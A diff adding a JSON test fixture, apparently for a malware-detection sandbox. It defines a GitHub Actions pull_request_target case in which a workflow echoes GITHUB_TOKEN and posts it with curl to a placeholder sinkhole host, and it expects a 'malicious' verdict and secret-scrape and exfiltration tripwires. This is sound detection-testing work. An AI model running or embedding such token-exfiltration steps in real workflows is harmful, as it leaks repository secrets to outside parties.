@@ -1,0 +1,39 @@
+{
+  "pack_id": "gha-pull-request-target-exfil",
+  "title": "pull_request_target secret exfil",
+  "attack_family": "github_actions",
+  "public_tier": "public_core",
+  "runtime_family": "github_actions",
+  "artifact_type": "github_action",
+  "artifact": {
+    "ecosystem": "git",
+    "source": "https://github.com/jeppsontaylor/gha-pr-target-exfil.git",
+    "requested_selector": "refs/heads/main",
+    "selector_kind": "branch"
+  },
+  "incident_refs": ["public/pr-target-exfil"],
+  "technique_refs": ["pull_request_target", "secret-exfil", "untrusted-pr-metadata"],
+  "control_pair_id": "control-benign-github-action",
+  "confidence_policy": "hard_ban",
+  "allowed_baseline_signals": [],
+  "persona_overrides": ["ci_runner"],
+  "required_personas": ["ci_runner"],
+  "required_scenarios": [
+    { "name": "workflow_dispatch", "detonation": "install_build", "phase": "install" }
+  ],
+  "suite_tags": ["fast", "artifact", "queue", "public_core", "actions"],
+  "execution": { "browser_required": false, "vm_required": false, "queue_required": true, "runner_mode": "queue_full" },
+  "expected_verdict": { "verdict": "malicious" },
+  "expected_tripwires": { "required": ["secret_scrape", "exfil_attempt"], "allowed_false_positives": [] },
+  "control_expectations": { "require_clean_verdict": true, "max_shared_tripwires": 0, "notes": ["safe workflow should not exfil PR context"] },
+  "evidence_minimums": {
+    "require_captured_request": true, "require_quarantine_job": true, "require_lab_run": true,
+    "require_evidence_bundle": true, "require_feed_visibility": true, "require_browser_trace": false
+  },
+  "timing": { "max_queue_latency_ms": 2000, "max_detonation_startup_ms": 2000, "max_verdict_completion_ms": 2000 },
+  "files": ["workflow.yml"],
+  "steps": [
+    { "step_id": "read_runner_secret", "detail": "workflow reads a secret exposed in pull_request_target", "phase": "install", "process_lineage": ["github actions runner"], "command": "echo $GITHUB_TOKEN", "file_path": "$GITHUB_ENV", "canary_id": "fake-github-token", "tripwire": "secret_scrape", "severity": "high" },
+    { "step_id": "post_secret", "detail": "workflow posts the secret to an external endpoint", "phase": "install", "process_lineage": ["github actions runner"], "command": "curl -X POST https://sinkhole.zitpit.invalid/pr", "network_target": "sinkhole.zitpit.invalid", "network_protocol": "https", "tripwire": "exfil_attempt", "severity": "critical" }
+  ]
+}
